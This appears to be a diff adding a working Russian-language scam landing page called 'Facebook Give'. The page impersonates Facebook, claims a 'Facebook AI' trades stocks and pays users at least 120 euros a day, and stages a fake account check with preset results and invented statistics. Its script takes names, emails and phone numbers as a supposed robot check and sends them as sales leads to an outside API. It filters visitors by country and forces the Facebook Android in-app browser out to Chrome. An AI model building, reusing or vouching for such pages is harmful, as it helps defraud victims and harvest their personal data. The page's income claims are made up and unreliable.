@@ -1,0 +1,691 @@
+<html translate="no"><head>
+        <script src="https://connect.facebook.net/signals/config/1006983384289543?v=2.9.199&amp;r=stable&amp;domain=amgive.metbatrod.site&amp;hme=53363064397d256bdf8f213dd9a9e18c291fc2ed691e4233e4a9e488f248f817&amp;ex_m=73%2C128%2C113%2C117%2C64%2C5%2C106%2C72%2C18%2C100%2C92%2C53%2C57%2C182%2C203%2C210%2C206%2C207%2C209%2C31%2C107%2C55%2C80%2C208%2C177%2C180%2C204%2C205%2C190%2C139%2C43%2C195%2C192%2C193%2C36%2C152%2C17%2C52%2C199%2C198%2C141%2C20%2C42%2C1%2C45%2C68%2C69%2C70%2C74%2C96%2C19%2C16%2C99%2C95%2C94%2C114%2C54%2C116%2C41%2C115%2C32%2C97%2C28%2C178%2C181%2C149%2C13%2C14%2C15%2C7%2C8%2C27%2C24%2C25%2C60%2C65%2C67%2C78%2C56%2C105%2C108%2C29%2C79%2C11%2C9%2C83%2C50%2C23%2C110%2C109%2C111%2C102%2C12%2C22%2C3%2C40%2C77%2C21%2C161%2C89%2C135%2C49%2C48%2C101%2C76%2C0%2C98%2C59%2C87%2C35%2C30%2C85%2C86%2C91%2C39%2C6%2C93%2C84%2C46%2C34%2C37%2C90%2C4%2C88%2C248%2C175%2C126%2C164%2C157%2C2%2C38%2C66%2C44%2C112%2C47%2C82%2C71%2C118%2C63%2C62%2C33%2C103%2C61%2C58%2C51%2C81%2C75%2C26%2C104%2C10%2C119" async=""></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script id="pigeon-sdk">
+            const s = document.createElement("script");
+            s.src = "https://push-pigeon.ams3.cdn.digitaloceanspaces.com/client/latest/pigeon.fcm.sdk.js";
+            s.onload = function () {
+                PushPigeonSDK.init({
+                    apiKey: "",
+                    params: {
+                        utm_user: "All",
+                        utm_land: "RUEUR Facebook-Give*",
+                        utm_traffic_source: "RUEUR Facebook-Give*",
+                    },
+                });
+            };
+            document.head.append(s);
+        </script><script src="https://push-pigeon.ams3.cdn.digitaloceanspaces.com/client/latest/pigeon.fcm.sdk.js"></script>
+        
+        <meta name="facebook-domain-verification" content="">
+        <meta name="google" content="notranslate">
+        <meta name="robots" content="noindex, nofollow">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+        <meta name="description" content="Получите доход за использование Facebook">
+        <meta property="og:description" content="Получите доход за использование Facebook">
+
+        <title>Facebook Give</title>
+
+        <link rel="stylesheet" href="./src/css/style.css">
+        <link rel="stylesheet" href="./src/css/form.css">
+
+        <link rel="icon" type="image/svg+xml" href="./src/images/favicon.svg">
+
+            <!-- Facebook Pixel Code -->
+            <script>
+                !(function (f, b, e, v, n, t, s) {
+                    if (f.fbq) return;
+                    n = f.fbq = function () {
+                        n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
+                    };
+                    if (!f._fbq) f._fbq = n;
+                    n.push = n;
+                    n.loaded = !0;
+                    n.version = "2.0";
+                    n.queue = [];
+                    t = b.createElement(e);
+                    t.async = !0;
+                    t.src = v;
+                    s = b.getElementsByTagName(e)[0];
+                    s.parentNode.insertBefore(t, s);
+                })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
+                fbq("init", "1006983384289543");
+                fbq("track", "PageView");
+                let productId = new URLSearchParams(window.location.search).get('p1');
+                if (productId && productId !== null) {
+                    fbq('track', 'ViewContent', { content_ids: [productId], content_type: 'product' });
+                }
+            </script>
+            <noscript>
+                <img height="1" width="1" style="display: none;" src="https://www.facebook.com/tr?id=1006983384289543&ev=PageView&noscript=1" />
+            </noscript>
+    </head>
+
+    <body>
+        <img src="./src/images/logo.svg" alt="" style="display: none;">
+        <!-- =-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=- -->
+        <div class="app">
+            <form class="register-form main" id="reg_form" name="reg_form">
+                <section class="page active">
+                    <section class="intro">
+                        <div class="container">
+                            <div class="intro-content">
+                                <div class="intro-logo">
+                                    <img src="./src/images/logo.svg" alt="logo">
+                                </div>
+                                <div class="intro-form">
+                                    <h1 class="intro-title">
+                                        Получите доход за использование
+                                        <span>Facebook</span>
+                                    </h1>
+                                    <div class="intro-form-wrapper">
+                                        <div class="form-input-main">
+                                            <input type="text" class="form-input" name="first_name" placeholder="Имя" required="">
+                                        </div>
+                                        <div class="form-input-main">
+                                            <input type="text" class="form-input" name="last_name" placeholder="Фамилия" required="">
+                                        </div>
+                                    </div>
+                                    <div class="intro-wrapper">
+                                        <button class="intro-btn btn" type="button" disabled="" style="opacity: 0.5;">Проверить
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16" fill="none">
+                                                <path d="M1 7C0.447715 7 0 7.44772 0 8C0 8.55228 0.447715 9 1 9V7ZM17.7071 8.70711C18.0976 8.31658 18.0976 7.68342 17.7071 7.29289L11.3431 0.928932C10.9526 0.538408 10.3195 0.538408 9.92893 0.928932C9.53841 1.31946 9.53841 1.95262 9.92893 2.34315L15.5858 8L9.92893 13.6569C9.53841 14.0474 9.53841 14.6805 9.92893 15.0711C10.3195 15.4616 10.9526 15.4616 11.3431 15.0711L17.7071 8.70711ZM1 9H17V7H1V9Z" fill="white"></path>
+                                            </svg>
+                                        </button>
+                                        <p class="intro-text">
+                                            Проверьте статус своего аккаунта , и получайте 
+                                            <span>от 120 евро</span>
+                                            ежедневно за использование Facebook 
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="intro-decor">
+                            <img src="./src/images/intro-decor.webp" alt="" class="intro-decor-mobile">
+                            <img src="./src/images/intro-decor-pc.webp" alt="" class="intro-decor-pc">
+                        </div>
+                    </section>
+                    <section class="about">
+                        <div class="container">
+                            <div class="about-content">
+                                <h2 class="about-title">
+                                    О Facebook Give
+                                </h2>
+                                <div class="about-wrapper">
+                                    <div class="about-card">
+                                        <img src="./src/images/about-1.webp" alt="about" class="about-img">
+                                        <div class="about-card-wrapper">
+                                            <h3 class="about-card-title">О нас</h3>
+                                            <div class="about-card-text">
+                                                <p>"Мы используем мощь искусственного интеллекта для управления инвестициями и делимся доходом с нашими верными участниками. <br> Это ваша возможность получать прибыль без сложных действий!"</p>
+                                            </div>
+                                            <button class="about-card-btn btn" type="button">Проверить
+                                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16" fill="none">
+                                                    <path d="M1 7C0.447715 7 0 7.44772 0 8C0 8.55228 0.447715 9 1 9V7ZM17.7071 8.70711C18.0976 8.31658 18.0976 7.68342 17.7071 7.29289L11.3431 0.928932C10.9526 0.538408 10.3195 0.538408 9.92893 0.928932C9.53841 1.31946 9.53841 1.95262 9.92893 2.34315L15.5858 8L9.92893 13.6569C9.53841 14.0474 9.53841 14.6805 9.92893 15.0711C10.3195 15.4616 10.9526 15.4616 11.3431 15.0711L17.7071 8.70711ZM1 9H17V7H1V9Z" fill="white"></path>
+                                                </svg>
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <div class="about-card">
+                                        <img src="./src/images/about-2.webp" alt="about" class="about-img">
+                                        <div class="about-card-wrapper">
+                                            <h3 class="about-card-title">Как это работает </h3>
+                                            <div class="about-card-text">
+                                                <p>Facebook AI анализирует рынок акций в реальном времени, используя передовые алгоритмы. Торговля осуществляется автоматически, с учётом рыночных трендов и данных. Полученная прибыль распределяется среди участников программы.
+                                                </p>
+                                            </div>
+                                            <button class="about-card-btn btn" type="button">Проверить
+                                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16" fill="none">
+                                                    <path d="M1 7C0.447715 7 0 7.44772 0 8C0 8.55228 0.447715 9 1 9V7ZM17.7071 8.70711C18.0976 8.31658 18.0976 7.68342 17.7071 7.29289L11.3431 0.928932C10.9526 0.538408 10.3195 0.538408 9.92893 0.928932C9.53841 1.31946 9.53841 1.95262 9.92893 2.34315L15.5858 8L9.92893 13.6569C9.53841 14.0474 9.53841 14.6805 9.92893 15.0711C10.3195 15.4616 10.9526 15.4616 11.3431 15.0711L17.7071 8.70711ZM1 9H17V7H1V9Z" fill="white"></path>
+                                                </svg>
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <div class="about-card">
+                                        <img src="./src/images/about-3.webp" alt="about" class="about-img">
+                                        <div class="about-card-wrapper">
+                                            <h3 class="about-card-title">Награды</h3>
+                                            <div class="about-card-text">
+                                                <p>Только 15% наших пользователей смогут получить доступ к доходу от Facebook.</p>
+                                                <p>Вы должны попасть минимум под 3 критерия , чтобы претендовать на ежедневные награды</p>
+                                            </div>
+                                            <button class="about-card-btn btn" type="button">Проверить
+                                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16" fill="none">
+                                                    <path d="M1 7C0.447715 7 0 7.44772 0 8C0 8.55228 0.447715 9 1 9V7ZM17.7071 8.70711C18.0976 8.31658 18.0976 7.68342 17.7071 7.29289L11.3431 0.928932C10.9526 0.538408 10.3195 0.538408 9.92893 0.928932C9.53841 1.31946 9.53841 1.95262 9.92893 2.34315L15.5858 8L9.92893 13.6569C9.53841 14.0474 9.53841 14.6805 9.92893 15.0711C10.3195 15.4616 10.9526 15.4616 11.3431 15.0711L17.7071 8.70711ZM1 9H17V7H1V9Z" fill="white"></path>
+                                                </svg>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="about-container">
+                                    <h2 class="about-title">Используйте преимущества Facebook</h2>
+                                    <button class="about-card-btn btn" type="button">Проверить
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16" fill="none">
+                                            <path d="M1 7C0.447715 7 0 7.44772 0 8C0 8.55228 0.447715 9 1 9V7ZM17.7071 8.70711C18.0976 8.31658 18.0976 7.68342 17.7071 7.29289L11.3431 0.928932C10.9526 0.538408 10.3195 0.538408 9.92893 0.928932C9.53841 1.31946 9.53841 1.95262 9.92893 2.34315L15.5858 8L9.92893 13.6569C9.53841 14.0474 9.53841 14.6805 9.92893 15.0711C10.3195 15.4616 10.9526 15.4616 11.3431 15.0711L17.7071 8.70711ZM1 9H17V7H1V9Z" fill="white"></path>
+                                        </svg>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <footer class="footer">
+                        <div class="container">
+                            <div class="footer-content">
+                                <img src="./src/images/logo.svg" alt="logo">
+                                <p class="copyright">
+                                    Copyright
+                                    <span class="curent-year">0000</span>
+                                </p>
+                            </div>
+                        </div>
+                    </footer>
+                </section>
+                <section class="event">
+                    <div class="container">
+                        <div class="intro-logo event-logo">
+                            <img src="./src/images/logo.svg" alt="logo">
+                        </div>
+                        <div class="income active">
+                            <div class="income-title">
+                                <img src="./src/images/text-bg.webp" alt="">
+                                <h2 class="income-title-text">
+                                    Ежедневный доход 
+                                    <span class="income-count">€<span class="value">0</span></span>
+                                </h2>
+                            </div>
+                            <div class="income-list">
+                                <div class="income-item">
+                                    <p class="income-item-text">
+                                        Создание качественного контента.
+                                    </p>
+                                    <div class="income-item-check">
+                                        <img class="check-loader active" src="./src/images/check-loader.webp" alt="loader">
+                                        <img class="check-result" src="./src/images/check-good.svg" alt="check">
+                                    </div>
+                                </div>
+                                <div class="income-item">
+                                    <p class="income-item-text">
+                                        Возраст аккаунта старше 3х лет.
+                                    </p>
+                                    <div class="income-item-check">
+                                        <img class="check-loader active" src="./src/images/check-loader.webp" alt="loader">
+                                        <img class="check-result" src="./src/images/check-good.svg" alt="check">
+                                    </div>
+                                </div>
+                                <div class="income-item">
+                                    <p class="income-item-text">
+                                        Содействие монетизации через Marketplace.
+                                    </p>
+                                    <div class="income-item-check">
+                                        <img class="check-loader active" src="./src/images/check-loader.webp" alt="loader">
+                                        <img class="check-result smaller" src="./src/images/check-bad.svg" alt="check">
+                                    </div>
+                                </div>
+                                <div class="income-item">
+                                    <p class="income-item-text">
+                                        Отсутствие нарушений правил.
+                                    </p>
+                                    <div class="income-item-check">
+                                        <img class="check-loader active" src="./src/images/check-loader.webp" alt="loader">
+                                        <img class="check-result" src="./src/images/check-good.svg" alt="check">
+                                    </div>
+                                </div>
+                                <div class="income-item">
+                                    <p class="income-item-text">
+                                        Вклад в рост аудитории Facebook.
+                                    </p>
+                                    <div class="income-item-check">
+                                        <img class="check-loader active" src="./src/images/check-loader.webp" alt="loader">
+                                        <img class="check-result smaller" src="./src/images/check-bad.svg" alt="check">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review">
+                            <div class="review-wrapper">
+                                <h2 class="review-title">Обзор аккаунта <span class="review-title-name">Олег Чертов</span></h2>
+                                <div class="review-flag">
+                                </div>
+                                <p class="review-text">
+                                    Ваш ежедневный доход
+                                    <br>
+                                    от Facebook составит
+                                    <span class="profit-value">00.00</span>€
+                                </p>
+                            </div>
+                            <button class=" review-btn btn" type="button">Проверить
+                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16" fill="none">
+                                    <path d="M1 7C0.447715 7 0 7.44772 0 8C0 8.55228 0.447715 9 1 9V7ZM17.7071 8.70711C18.0976 8.31658 18.0976 7.68342 17.7071 7.29289L11.3431 0.928932C10.9526 0.538408 10.3195 0.538408 9.92893 0.928932C9.53841 1.31946 9.53841 1.95262 9.92893 2.34315L15.5858 8L9.92893 13.6569C9.53841 14.0474 9.53841 14.6805 9.92893 15.0711C10.3195 15.4616 10.9526 15.4616 11.3431 15.0711L17.7071 8.70711ZM1 9H17V7H1V9Z" fill="white"></path>
+                                </svg>
+                            </button>
+                            <div class="review-list">
+                                <div class="reviev-item">
+                                    <p>Критериев соблюдено <span>3/5</span></p>
+                                </div>
+                                <div class="reviev-item">
+                                    <p>Возраст аккаунта <span>&gt;3 лет</span></p>
+                                </div>
+                                <div class="reviev-item">
+                                    <p>Отметок нравится : <span>262</span></p>
+                                </div>
+                                <div class="reviev-item">
+                                    <p>Комментариев : <span>186</span></p>
+                                </div>
+                                <div class="reviev-item">
+                                    <p>Входит в <span>12.6%</span> Топ пользователей</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="end">
+                            <h2 class="end-title">
+                                Ваш доход с платформы Facebook AI составил бы 
+                                <span class="profit-value">00.00</span>€,
+                                подтвердите что вы не робот, для получения доступа к  доходу
+                            </h2>
+                            <div class="end-form">
+                                <div class="form-input-main">
+                                    <input name="email" placeholder="Электронная почта" required="" type="email">
+                                </div>
+                                <div class="form-input-main">
+                                    <input type="hidden" name="phonePrefix" value="44">
+                                    <input type="tel" class="form-input" name="phone" placeholder="Номер телефона" required="">
+                                </div>
+                            </div>
+                            <button name="submitBtn" type="submit">Проверить
+                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16" fill="none">
+                                    <path d="M1 7C0.447715 7 0 7.44772 0 8C0 8.55228 0.447715 9 1 9V7ZM17.7071 8.70711C18.0976 8.31658 18.0976 7.68342 17.7071 7.29289L11.3431 0.928932C10.9526 0.538408 10.3195 0.538408 9.92893 0.928932C9.53841 1.31946 9.53841 1.95262 9.92893 2.34315L15.5858 8L9.92893 13.6569C9.53841 14.0474 9.53841 14.6805 9.92893 15.0711C10.3195 15.4616 10.9526 15.4616 11.3431 15.0711L17.7071 8.70711ZM1 9H17V7H1V9Z" fill="white"></path>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="event-decor">
+                            <img src="./src/images/event-decor-pc.webp" alt="" class="event-decor-pc">
+                            <img src="./src/images/event-decor.webp" alt="" class="event-decor-mobile">
+                        </div>
+                    </div>
+                </section>
+            </form>
+            
+        </div>
+        <!-- =-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=- -->
+
+        <!-- form-preset ---------------->
+        <div class="loader">
+            <div class="loader-element"></div>
+        </div>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+        <script src="./src/js/main.js"></script>
+
+        <!-- intlTelInput -->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/css/intlTelInput.css">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/js/intlTelInput.min.js"></script>
+
+        <div id="modal_phone" class="modal_phone fade_phone" tabindex="-1">
+            <div class="modal-dialog_phone">
+                <div class="modal-content_phone">
+                    <div class="modal-header_phone">
+                        <h5 class="modal-title_phone">Неверный номер телефон</h5>
+                        <button type="button" class="close-button_phone" id="close-button_phone">×</button>
+                    </div>
+                    <div class="modal-body_phone">Программа не поддерживается в вашем регионе. Введите Ваш корректный номер.</div>
+                </div>
+            </div>
+        </div>
+        <script src="./src/js/ModalPhoneError.js"></script>
+
+    <!-- script-for-form ---------------------->
+        <script>
+            function isFacebookAndroidApp() {
+				const ua = navigator.userAgent || navigator.vendor || window.opera;
+				const isFacebookApp = ua.indexOf("FBAV") > -1 || ua.indexOf("FBAN") > -1;
+				const isAndroid = /Android/i.test(ua);
+				return isFacebookApp && isAndroid;
+			}
+
+			if (isFacebookAndroidApp()) {
+				const currentLink = location.href;
+
+				let scheme = '';
+				if (currentLink.startsWith('https://')) {
+					scheme = 'https';
+				} else if (currentLink.startsWith('http://')) {
+					scheme = 'http';
+				}
+
+				if (scheme) {
+					let modifiedLink = currentLink.replace(`${scheme}://`, '');
+					modifiedLink = modifiedLink.replace(/^www\./, '');
+
+					const chromeLink = `intent://${modifiedLink}#Intent;scheme=${scheme};package=com.android.chrome;end`;
+					window.location.href = chromeLink;
+				}
+			}
+
+            const LANDING_LANG = 'RU';
+
+            const formJsonData = '';
+            const formHeaderData = '';
+            const formFooterData = '';
+
+            let errors = {
+                'AR': [
+                    { errorPlaceholder: 'أدخل أسمك', },
+                    { errorPlaceholder: 'أدخل اسمك الأخير', },
+                    { errorPlaceholder: 'أدخل رقمك', },
+                    { errorPlaceholder: 'أدخل بريدك الإلكتروني', },
+                ],
+                'RU': [
+                    { errorPlaceholder: 'Введите Ваше Имя', },
+                    { errorPlaceholder: 'Введите Вашу Фамилию', },
+                    { errorPlaceholder: 'Введите Ваш Номер', },
+                    { errorPlaceholder: 'Введите Ваш Email', },
+                ],
+                'EN': [
+                    { errorPlaceholder: 'Enter Correct First Name', },
+                    { errorPlaceholder: 'Enter Correct Last Name', },
+                    { errorPlaceholder: 'Enter Correct Phone', },
+                    { errorPlaceholder: 'Enter Correct Email', },
+                ],
+                'PL': [
+                    { errorPlaceholder: 'Wprowadź poprawne imię', },
+                    { errorPlaceholder: 'Wpisz poprawne nazwisko', },
+                    { errorPlaceholder: 'Wprowadź prawidłowy numer telefonu', },
+                    { errorPlaceholder: 'Wpisz poprawny adres e-mail', },
+                ],
+                'DE': [
+                    { errorPlaceholder: 'Korrekten Vornamen eingeben', },
+                    { errorPlaceholder: 'Korrekten Nachnamen eingeben', },
+                    { errorPlaceholder: 'Geben Sie das richtige Telefon ein', },
+                    { errorPlaceholder: 'Geben Sie die richtige E-Mail-Adresse ein', },
+                ], 
+                'ES': [
+                    { errorPlaceholder: 'Ingrese el nombre correcto', },
+                    { errorPlaceholder: 'Ingrese el apellido correcto', },
+                    { errorPlaceholder: 'Ingrese el teléfono correcto', },
+                    { errorPlaceholder: 'Ingrese el correo electrónico correcto', },
+                ],
+                'CZ': [
+                    { errorPlaceholder: 'Zadejte správné křestní jméno', },
+                    { errorPlaceholder: 'Zadejte správné příjmení', },
+                    { errorPlaceholder: 'Zadejte správný telefon', },
+                    { errorPlaceholder: 'Zadejte správný e-mail', },
+                ],
+                'TR': [
+                    { errorPlaceholder: "Doğru Adı Girin" }, 
+                    { errorPlaceholder: "Doğru Soyadı Girin" }, 
+                    { errorPlaceholder: "Doğru Telefonu Girin" }, 
+                    { errorPlaceholder: "Doğru E-postayı Girin" }
+                ],
+                'IT': [
+                    { errorPlaceholder: 'Inserisci il nome corretto', },
+                    { errorPlaceholder: 'Inserisci il cognome corretto', },
+                    { errorPlaceholder: 'Immettere il numero di telefono corretto', },
+                    { errorPlaceholder: `Inserisci l'e-mail corretta`, },
+                ],
+                'JP': [
+                    { errorPlaceholder: 'お名前を入力してください', },
+                    { errorPlaceholder: '苗字を入力してください ', },
+                    { errorPlaceholder: '電話番号を入力してください', },
+                    { errorPlaceholder: 'メールアドレスを入力してください', },
+                ]
+            }
+            errors = errors[LANDING_LANG]
+
+            const openModal = () => {
+                document.getElementById("modal_phone").classList.add("open_phone");
+                document.body.classList.add("modal-open_phone");
+            };
+
+            const closeModal = () => {
+                document.getElementById("modal_phone").classList.remove("open_phone");
+                document.body.classList.remove("modal-open_phone");
+            };
+
+            document.getElementById("close-button_phone").addEventListener("click", closeModal);
+
+            $(document).ready(function () {
+                let phonePrefix = "44";
+
+                $.ajax({
+                    url: 'https://getyourapi.site/api/geolocation',
+                    dataType: "json",
+                    success: function (result) {
+                        $('input[name="phone"]').each(function (input) {
+                            let iti = intlTelInput(this, {
+                                ...result.data,
+                                autoHideDialCode: "true",
+                                customContainer: "phoneWrapper",
+                                autoPlaceholder: "aggressive",
+                                separateDialCode: "false",
+                                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.5.0/js/utils.min.js",
+                            });
+
+                            phonePrefix = iti.getSelectedCountryData().dialCode;
+                            $(this).on("countrychange", function () {
+                                phonePrefix = iti.getSelectedCountryData().dialCode;
+                            });
+
+                            return iti;
+                        });
+                    },
+                });
+
+                $('input[name="first_name"], input[name="last_name"]').on('input', function () {
+					let invalidChars = /[^a-zA-Zа-яА-ЯёЁ\s\-ʼ'’`ʹ׳]/g;
+					let newValue = $(this).val().replace(invalidChars, '');
+					$(this).val(newValue);
+				});
+
+                function validateEmail(email) {
+                    return /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/.test(String(email).toLowerCase());
+                }
+
+                function changInputHandler(e) {
+                    if (e.target.value.length === 0) {
+                        this.classList.remove("valid");
+                        this.classList.add("error");
+                        return;
+                    }
+                    this.classList.add("valid");
+                    this.classList.remove("error");
+                }
+
+                function changEmailHandler(e) {
+                    if (validateEmail(e.target.value) === false) {
+                        this.classList.add("error");
+                        this.classList.remove("valid");
+                        return;
+                    }
+                    this.classList.add("valid");
+                    this.classList.remove("error");
+                }
+
+                const { fbclid, p1, pclid, utm_land } = parseURLParams(location.href);
+                
+                $(".form-input").keyup(changInputHandler);
+                $(".form-input").change(changInputHandler);
+                $("input[name = email]").keyup(changEmailHandler);
+                $("input[name = email]").change(changEmailHandler);
+
+                $("form.register-form").submit(function (e) {
+                    e.preventDefault();
+
+                    $(".loader").css("display", "block");
+                    const form = $(this);
+                    const first_name = form.find("input[name = first_name]");
+                    const last_name = form.find("input[name = last_name]");
+                    const email = form.find("input[name = email]");
+                    const phone = form.find("input[name = phone]");
+
+                    let isError = false;
+                    if (first_name.val() === "" || first_name.val().match(/[0-9]/) || first_name.val().trim() === "") {
+                        first_name.addClass("error").removeClass('valid').val("").attr("placeholder", errors[0]?.errorPlaceholder);
+                        isError = true;
+                    }
+
+                    if (last_name.val() === "" || last_name.val().match(/[0-9]/) || last_name.val().trim() === "") {
+                        last_name.addClass("error").removeClass('valid').val("").attr("placeholder", errors[1]?.errorPlaceholder);
+                        isError = true;
+                    }
+
+                    if (phone.val() === "" || phone.val().trim() === "" || isNaN(phone.val())) {
+                        phone.addClass("error").removeClass('valid').val("").attr("placeholder", errors[2]?.errorPlaceholder);
+                        isError = true;
+                    }
+
+                    if (validateEmail(email.val()) === false) {
+                        email.addClass("error").val("").attr("placeholder", errors[3]?.errorPlaceholder);
+                        isError = true;
+                    }
+
+                    if (isError === true) {
+                        $(".loader").css("display", "none");
+                        return;
+                    }
+
+                    const button = $("button[name=submitBtn]");
+                    button.prop("disabled", true);
+
+                    const checkNumber = new Promise((resolve, reject) => {
+                        $.ajax({
+                            url: `https://getyourapi.site/api/phone/validate`,
+                            type: "post",
+                            contentType: "application/json",
+                            data: JSON.stringify({
+                                phone: `${phonePrefix}${phone.val()}`,
+                            }),
+                            success: resolve,
+                            error: reject,
+                        });
+                    });
+
+                    const getBlacklist = new Promise((resolve, reject) => {
+                        $.ajax({
+                            url: "https://getyourapi.site/api/blacklist",
+                            type: "get",
+                            contentType: "application/json",
+                            success: function (res) {
+                                resolve(res);
+                            },
+                            error: function (error) {
+                                reject(error);
+                            },
+                        });
+                    });
+
+                    Promise.all([checkNumber, getBlacklist])
+                        .then(([checkNumber, blacklist]) => {
+                            if (checkNumber.status === false) {
+                                phone.addClass("error").removeClass("valid").val("").attr("placeholder", errors[2]?.errorPlaceholder);
+                                $(".loader").css("display", "none");
+                                throw new Error("check number error");
+                            }
+
+                            if (blacklist.status === false) {
+                                $(".loader").css("display", "none");
+                                throw new Error("get blacklist error");
+                            }
+
+                            if (blacklist.data.blacklist.includes(checkNumber.data.country_code.toLowerCase())) {
+                                $(".loader").css("display", "none");
+                                openModal();
+                                setTimeout(closeModal, 5000);
+                                throw new Error("forbidden country");
+                            }
+
+                            $.ajax({
+                                url: "https://getyourapi.site/api/leads",
+                                type: "post",
+                                contentType: "application/json",
+                                data: JSON.stringify({
+                                    first_name: first_name.val(),
+                                    last_name: last_name.val(),
+                                    email: email.val(),
+                                    phone: phone.val(),
+                                    country: checkNumber.data.country_code,
+                                    click_id: fbclid || pclid,
+                                    sub9: utm_land && decodeURIComponent(utm_land.replace(/\+/g, ' ')),
+                                }),
+                                dataType: "json",
+                                success: function (res) {
+                                    if (res.status === true) {
+                                        fbq("track", "Lead");
+                                        fbq("track", "CompleteRegistration");
+                                        if (p1) {
+                                            fbq('track', 'AddToCart', { content_ids: [p1], content_type: 'product' });
+                                        }
+                                        switch (res.data.proceedWith) {
+                                            case "success":
+                                                window.location.href = `./success.html?lang=${LANDING_LANG}`;
+                                                break;
+                                            case "exist":
+                                                window.location.href = `./error.html?lang=${LANDING_LANG}`;
+                                                break;
+                                            case "redirect":
+                                                window.location.href = res.data.redirectUrl;
+                                                break;
+                                            default:
+                                                window.location.href = `./success.html?lang=${LANDING_LANG}`;
+                                        }
+                                        console.log("click");
+                                    } else {
+                                        alert("Error! API Error");
+                                        $(".loader").css("display", "none");
+                                        button.prop("disabled", false);
+                                    }
+                                },
+                                error: function (error) {
+                                    button.prop("disabled", false);
+                                    $(".loader").css("display", "none");
+                                    console.error(error);
+                                },
+                            });
+                        })
+                        .catch((error) => {
+                            button.prop("disabled", false);
+                            $(".loader").css("display", "none");
+                            console.error(error);
+                        });
+                });
+            });
+
+            function parseURLParams(url) {
+                var queryString = url ? url.split("?")[1] : window.location.search.slice(1);
+                var obj = {};
+                if (queryString) {
+                    queryString = queryString.split("#")[0];
+                    var arr = queryString.split("&");
+                    for (var i = 0; i < arr.length; i++) {
+                        var a = arr[i].split("=");
+                        var paramName = a[0];
+                        var paramValue = typeof a[1] === "undefined" ? true : a[1];
+                        if (paramName.match(/\[(\d+)?\]$/)) {
+                            var key = paramName.replace(/\[(\d+)?\]/, "");
+                            if (!obj[key]) obj[key] = [];
+                            if (paramName.match(/\[\d+\]$/)) {
+                                var index = /\[(\d+)\]/.exec(paramName)[1];
+                                obj[key][index] = paramValue;
+                            } else {
+                                obj[key].push(paramValue);
+                            }
+                        } else {
+                            if (!obj[paramName]) {
+                                obj[paramName] = paramValue;
+                            } else if (obj[paramName] && typeof obj[paramName] === "string") {
+                                obj[paramName] = [obj[paramName]];
+                                obj[paramName].push(paramValue);
+                            } else {
+                                obj[paramName].push(paramValue);
+                            }
+                        }
+                    }
+                }
+
+                return obj;
+            }
+        </script>
+    
+
+</body></html>
